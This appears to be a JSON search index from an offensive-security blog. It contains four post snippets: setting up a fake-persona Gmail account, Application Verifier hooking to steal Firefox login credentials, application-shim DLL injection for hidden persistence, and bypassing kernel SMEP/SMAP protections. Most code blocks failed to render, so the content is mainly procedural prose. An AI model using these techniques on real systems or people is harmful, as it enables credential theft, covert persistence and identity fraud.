email address that will be used to regain access to your Gmail in case of lockout it is advised to use a unique, strong password if you have reason to believe your account would be targeted for takeover by a third-party.Registering With GmailAnd now the section you’ve been waiting for. Visit the Google Signup Page Fill out the signup form. Personally I just copy paste the information generated by FakeNameGenerator. Ensure your Birthday puts you in the appropriate 13-15 year age range. Leave the Mobile phone field blank. Provide your recovery email in the Your current email address field. Click Next step. Confirm your recovery email by clicking the link provided by Google that will be sent to your provided recovery email address. Enjoy your new Gmail account. Note: While using Tor will almost instantly get you flagged, attempting to create multiple Gmail accounts in this way using the same IP address and without clearing your browsing session will often result in the registration getting flagged by SABV and causing you to get the phone verification prompt.ClosingNow that you’ve got your own real-life verified Gmail account the world is your oyster. The next article in this series will cover some of the services you can use your fake persona with to start creating a believable online identity." }, { "title": "Leveraging Application Verifier for Function Hooking and Persistence", "url": "/posts/leveraging-application-verifier-for-function-hooking-and-persistence/", "categories": "", "tags": "Windows, Persistence", "date": "2017-06-02 00:00:00 +0800", "snippet": "Introduction to Application VerifierFunction hooking is a powerful tool for attackers. The ability to inspect and modify data structures as they’re passed between functions within a program gives an attacker lots of options for session riding, credential theft, parameter modification, etc. We’re going to take a look at an excellent tool that is provided to us by Microsoft called Application Verifier, which can be leveraged to perform hooking(and persistence) in a trivial, yet powerful manner by letting us run code in the context of an arbitrary unmanaged(native) application.The MSDN page describes AppVerifier as such:Application Verifier assists developers in quickly finding subtle programming errors that can be extremely difficult to identify with normal application testing. Using Application Verifier in Visual Studio makes it easier to create reliable applications by identifying errors caused by heap corruption, incorrect handle and critical section usage.Application Verifier loads a particular Verification Provider into a process as it starts up. This provider, which comes in the form of a DLL, should contain the tests that are to be run in the context of the application being tested. These “tests” can be arbitrary. The provider is loaded at application startup, right after NTDLL.dll; Because of this, we won’t have access to managed code segments in our attack code because we cannot load the CLR (Common Language Runtime, AKA .Net’s execution environment) this early. For most things, this isn’t an actual problem, but it’s good to know.So, we can load code into any application as it starts using a mechanism provided by the operating system? LD_PRELOAD anyone? Let’s see how we can leverage this.Overall, the process of getting our code launched is as follows: We create a DLL which serves as the Verification Provider. This DLL is supposed to run routines that verify the application that it is loaded into. It will contain our function hooks and other code. We will drop this into %windir%\\System32\\ or %windir%\\SysWoW64\\ (depending on the bitness of the target application). We create a registry key with a few subvalues which sets a few flags (to enable Application Verifier in the right mode) and detailing the name of the library which will serve as the verification provider (our malicious DLL). When the application starts (before other libraries are loaded, with the exception of NTDLL) our Verification Provider will be loaded and execute its code. The load reason will not be THREAD_ATTACH or PROCESS_ATTACH as it typically is when a DLL is loaded. The value of fdwReason in this case is 4, which an existing symbol does not exist for. We will just define as VERIFIER_LOADED ourselves for readability and convenience.Note that this method requires administrator privileges (a UAC bypass should happen before installing the verification provider and its accompanying registry entries), as we’re writing to HKLM and performing a privileged copy into System32 or SysWow64.DemonstrationFor the demonstration of these capabilities, we’re going to inspect and log POST requests made by Firefox by hooking the PR_WRITE function. This will give us access to the data as it’s being sent, just before it becomes encrypted with TLS and sent over the network.Details on PR_WRITE and other functions in the Netscape Portable Runtime can be found here.You can parse these requests with regular expressions to extract usernames and passwords from POST requests sent to login pages, for example. These siphoned passwords or sensitive requests can be loggedto a 3rd party server. I won’t go over writing the regular expressions or reporting aspect, as this article is meant to focus on the deployment and implementation of the hook. When the function is called, our code will execute before the real function and we will be able to inspect or modify the data before forwarding it to the real function. For PR_WRITE, the data being written to the specified file descriptor(fd) is stored in the buf parameter.The CodeSometimes you’ll be working with mostly opaque code (no source available) and have to deal with reverse engineering to determine structure types and contents, function prototypes, etc. This can suck. In this case howerver, the code we’re looking for (the Netscape Portable Runtime headers) is available for inspection and copypasta. We’ll be using their headers to define the structures we’re accessing.Note that when compiling this DLL, its bitness must match the target application. You must also disable the CLR and set the entrypoint to DllMain. Not doing so will cause the verifier to fail to load. If you decide to implement any assembly routines to be run, you should also then disable optimizations. Visual Studio makes doing these things fairly easy via tweaking project settings.400: Invalid requestWith our DLL compiled, we just copy it into the correct directory like so:Then create the key firefox.exe under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Current Version\\Image File Execution Options\\. Add the following values:Then launch Firefox from WinDbg.Press g to release the breakpoint and let Firefox continue execution, then navigate to a website. I’ll go to Google.com; We can see in the window that our traffic that is passing through PR_WRITE is being logged successfully.Now let’s do a test to see if we really do have access to sensitive traffic. I’ll try to log into Twitter (with fake credentials of course).Now let’s inspect our traffic log file and search for these values:Awesome. The selection in question is also trivial to write a regular expression for, so you could write a version of this hook that excludes all of the “junk” traffic and only reports the username and password values with a regular expression filter.With Respect To PersistenceInstead of installing a function hook, you could simply use this code execution point as a springboard to launch some other component of your malware. You can still use the DLL_PROCESS_ATTACH event as normal, and it’s subject to all the same restrictions as it typically is.Sources: Reiley Yang’s MSDN Blog Post EP_X0FF’s KernelMode.info thread Alex Ionescu’s Presentation" }, { "title": "Post Exploitation Persistence With Application Shims (Intro)", "url": "/posts/post-exploitation-persistence-with-application-shims-intro/", "categories": "", "tags": "Windows, Persistence", "date": "2016-08-13 00:00:00 +0800", "snippet": "About Application ShimsAs new versions of Windows get released, and system APIs get updated, older applications develop problems. Some wont install/run because theyre only coded to check for compatibility with Windows 95 for example, and have no idea what to do with the version strings supplied by Windows 7 except call it incompatible. Some rely on legacy paths which are no longer present in newer version of Windows, such as the difference between the path to the users home directory when comparing Windows XP and Windows 7. While some vendors may provide extended support to these older products to companies on a case-by-case basis, a large number turn into abandonware. Then companies are faced with the decision of either running a super legacy system on their network and getting #rekt, or patching the application to work on newer systems. Some applications fill a very niche role in environments and cannot be easily replaced, or have no modern replacement. In this case, workarounds are needed.Microsoft recognized this issue, and created the ACT (Application Compatibility Toolkit), which you can install to create fix packages targeting specific applications. You create a database of one or more application fixes. The fixes are then read out of the database, and installed on the target machine. The fixes do a wide variety of things, from lying about the OS version to the application, to redirecting accessed paths, to using legacy API functions over the newer ones, and even denying it read/write to resources that it really does have access to (which can lead to some fun application sandboxing scenarios). This all happens transparently to the application. Naturally, the ability to lie to applications and the execution environment can, and will, be abused.InjectDLL DemoFirst, download the appropriate packaged version for your Windows target. You can grab the Windows 10 version here. It (at least the Windows 10 version) is being bundled with the ADK, and you can check/uncheck different components. The only one we need for this will be the ACT, so check that.For the first (and probably most useful) example, well be utilizing a useful fix that allows us to preload a DLL into an application. Yes, Microsoft provided a signed implementation of DLL injection just for us! We’ll be creating a fix for Putty that injects a DLL at application startup to run some of our own code. This fix just scratches the surface of what you can do with shims, and I plan to expand more on this as a post-exploitation kit in later posts. But for now, lets get down to it.After installation, the compatibility toolkit will be located in %ProgramFiles(x86)\\Windows Kits\\10\\Assessment and Deployment Kit\\Application Compatibility Toolkit\\Compatibility Administrator (xx-bit)\\Compatadmin.exe. There will be separate management applications for 32 and 64 bit shims. Its worth noting that you must create a 32 bit shim for a 32 bit application, and likewise a 64 bit shim for a 64 bit application.When launching the application compatibility toolkit, youll initially have access to a very limited set of application fixes. These are the most commonly used ones, and cover the majority of needs for legitimate fixes. However, there is an undocumented command line option (/x)that unlocks the rest of the fixes, yielding just under 900 available choices for the 32 bit compatibility toolkit at the time of writing. You may as well launch with that option right away.After launching, youll be presented with the management interface. This will let you create, update, and manage shim databases.With New Database selected (the default, unsaved shim database), click the Fix button near the top of the window. This will open the dialog to create a new application fix. Here, youll fill in some basic fields with information about the fix youre creating. They can be filled in with bogus information, with the exception of the path to the executable to be shimmed.The next screen involves compatibility modes. These offer options to make older applications work on newer systems by lying about the environment (OS Version, graphics modes, etc). These arent relevant for this example, so you can skip them by hitting next.This next screen, however, offers some interesting options to play with. The one were concerned with here is named InjectDLL. Select it by checking the box next to it, then click the Parameters button to configure how we want it to behave. These fixes dont have customized parameter dialogs, so youll have to mouse over the fix name to get a basic description of what parameters it takes. The InjectDLL fix takes a list of paths to DLLs to be loaded during application startup. For this example, I just dropped it on the root of the drive. Dont do this with real malware. That would be dumb.The code I used for this InjectDLL example is the following:400: Invalid requestIt just pops a message box for the sake of visual demonstration. A real payload you might use for Putty would be PuttyRider, or some keylogger.The final screen lets you specify which properties will trigger an application match for the shim. If you were shimming an application that may update in the future, youd probably want to uncheck or modify some of these to be a looser match. An internet browser would be a good example. If your shim matching information doesnt align with the program, the shim wont apply. You can play around with these, most will be dependent on the app being shimmed. For this example, we’ll leave them all in their default state.Once all that is finished, you can click Save to save and name your shim database, which will be a .sdb file. This shim is portable, and can be dropped and installed on new systems, so long as you fulfill the parameters that you set for it yourself. For this example, Id want to drop my DLL in the correct location, and ensure that the target application is installed at the path I expect it to be. Anyway, lets install the shim. You can use a utility that ships with Windows (the ACT does not need to be installed) to install your shim database, and the command is pleasantly simple.Note that for this to work, you will need administrative privileges, and have bypassed UAC. UAC bypasses arent particularly hard to come by, so I wouldnt consider that a restriction really. If you land yourself in an unprivileged user account, though, youll have to escalate first.Now, all we have to do is start up Putty to demonstrate the DLL preload. Our code should run (popping the message box). After the DLLMain method returns, normal program execution will resume.This is a useful method to add to your persistence toolkit. You can shim applications that are part of daily routine for your target (parts of the Microsoft Office Suite, web browsers, etc) for reliable callbacks. This method does have a strong caveat however, which youll need to account for. Your shim name will show up in the list of installed applications on the target system if you use the default shim installation utility.It is possible to avoid this, however. The sdbinst.exe utility simply copies the shim database file to %WINDIR%\\AppPatch\\Custom\\ (with the GUID as the filename), and creates a few registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags to inform AppCompat of the installed shim, and finally adds it to the installed applications list. However, you could create a shim installer to perform these actions yourself, minus the addition to the installed applications list. Your custom installer would still be subject to the restrictions of a UAC bypass and administrative rights.The next shims post will cover some advanced usage, including custom x64 fixes (we dont get access to InjectDLL for 64 bit fixes, so we have to roll our own custom generated fix) and custom shim installers, as well as functionality for some rootkit-esque functionality." }, { "title": "Kernel Defenses, Detection, and Exploitation", "url": "/posts/kernel-defenses-detection-and-exploitation/", "categories": "", "tags": "exploitation, kernel", "date": "2016-07-27 00:00:00 +0800", "snippet": "Intro: Nothing Good Lasts ForeverAs mainstream shifts their attention towards the kernel landscape its sponsored defenses have made their way into our everyday hardware and officially supported kernel images. With any new defense the implementation and adoption is slow, but utilization on target systems will only increase in the years to come. Some exploit developers have had lots of time to play with these new defenses (KERNEXEC/UDEREF), but the newer generation have yet had the need to take aim against these hardened kernels. While the obvious(ly hilarious) KASLR (aka noob-killer) is gaining wide support in public circles there are two other cpu-supported defenses to be aware of. These being SMAP (Supervisor Mode Access Prevention) and SMEP (Supervisor Mode Execution Protection).What is SM[AE]P?Supervisor Mode Execution Protection (SMEP) is easy to understand if youre familiar with control flow and/or userland memory protection techniques. A generic kernel exploit back in the days of old allowed you to move execution control (IP/PC/etc.) to a userland controlled page with your buffer in it. This allowed kernel context to execute code from a userland mmap(, PROT_EXEC); controlled buffer. SMEP is here to ruin that party and deny kernel context to execute code from userland address space. Its basically NX for userland/kernel page boundaries. If anyone has ever played with KERNEXEC, here we have it supported hardware.Supervisor Mode Access Prevention (SMAP) is more of an oddity which has aided to interesting implementation. This technique denies READ/WRITE access from kernel context to userland data. This allows both defenses combined to filter privilege control over the RWX spectrum. The problem is that telling the kernel what it can or cannot access is difficult. Sometimes data structures in userland need to be read or modified by kernel context and, obviously, userland data needs to be pulled for communication channels such as get_user() and put_user(). Due to this need we get a hilariously easy to bypass defense that is documented, not talked about in the loudest whitehat circles, and so seemingly odd that kernel developers accidentally marked huge code regions to not use the protection.What is CPUID?CPUID is an instruction implemented on modern cpu architectures. A large assortment of interesting information can be retrieved with CPUID by setting two arguments/registers and ANDing the returned result with a proper mask. These arguments are defined as the leaf node and the sub-leaf. The leaf node is the main category of information youre requesting cpuid for and it is controlled via the EAX register. The sub-leaf is barely used, but calls into a section of the main section via the ECX register. Its highly suggested that the interested reader take a look at the references in cpuid(4), at their own cpuid output, and a table of leafs/sub-leafs and associated returns.Of interest in the above link is the Extended Features section (eax/leaf = 7 and ecx/subleaf = 0). This allows the caller to execute an unprivileged instruction that validates security features enabled on the victim system.Detecting SM[AE]P via CPUID Instruction Code /* * unprivileged cr4 value detection with cpuid * cpu&#39;s that support cpuid instruction will work (if not, cpu likely doesn&#39;t support SM[AE]P anyway) * problem is, although unlikly, bits can move and mask may be incorrect for specific cpu&#39;s * you can double validate by grep -oE &quot;sm[ae]p&quot; /proc/cpuinfo */ int op = 0x07; /* leaf */ int smep_mask = 0x00000080; int smap_mask = 0x00100000; uint32_t regs[4] = { 0 }; // no error detection, this will fault you if cpu doesn&#39;t support this instruction asm volatile(&quot;cpuid&quot; : &quot;=a&quot; (regs[0]), &quot;=b&quot; (regs[1]), &quot;=c&quot; (regs[2]), &quot;=d&quot; (regs[3]) \\ : &quot;0&quot; (op), &quot;2&quot; (0)); // SMEP if ( (smep_mask &amp;amp; regs[1]) != 0) { ... // SMAP if ( (smap_mask &amp;amp; regs[1]) != 0) {Implementation of and Bypassing SM[AE]PWith all the pre-requisite information out of the way, lets get to the reason you all came here today. How to get around these new kernel defenses? Say, again, we have a vulnerability that gives a WRITE-WHAT-WHERE primitive and we know the KASLR sliding window via the millions and one ways possible to due so.SMEP does not have a straightforward method to disable itself. Without being able to move execution to your own userland buffer, how do we start control flow? The SMEP bit exists in the 7th bit of the CR4 register, so it is possible to manipulate the cr4 register with logical bit-wise instructions (AND, OR, XOR), shifts, or even bitmask writes. However, the most likely path to be taken here is to do as you would in userland, which is to utilize borrowed code gadgets. Thankfully the kernel has a large surface to generate gadgets from. Grab the targets vmlinuz, search for gadgets, then KASLR_SLIDE+offset. If you are having a hard time getting the KASLR slider, chances are youll end up OOPSing the system in the first place.SMAP, on the other hand, is much easier to work with. SMAP exists in the 20th bit in the cr4 register, but well just ignore the shit out of this protection mechanism. Remember that the kernel must be able to access userland data for a large assortment of tasks, such as taking arguments and data from userland. So they decided to utilize a documented “fuck you” bypass flag called Alignment Check/EFLAGS.AC. Regardless if that fancy new kernel protection mechanism is enabled and being the bitch bit on your userland page, we can simply call STAC and set the AC flag and completely bypass it. Not only that but this instruction is all of 3 bytes (0f 01 CB). Thats right, if you can manage to find this sequence of 3 bytes inside of the kernel .text range, you win and SMAP cries a shameful death and your function pointer ovewrite, IDT entry overwrite, or whatever fanciness you want can continue." } ]
